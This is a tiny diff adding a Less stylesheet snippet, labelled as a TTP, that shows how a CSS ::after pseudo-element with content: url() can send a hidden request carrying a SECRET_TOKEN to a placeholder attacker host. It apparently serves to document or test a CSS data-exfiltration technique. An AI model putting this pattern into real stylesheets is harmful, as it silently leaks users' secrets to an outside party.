@@ -1,0 +1,7 @@
+// TTP: Use ::after pseudo-element to create hidden exfil requests.
+
+@exfilUrl: "https://attacker.example.com/exfil?data=";
+
+.exfilClass:after {
+  content: url("@{exfilUrl}SECRET_TOKEN");
+}
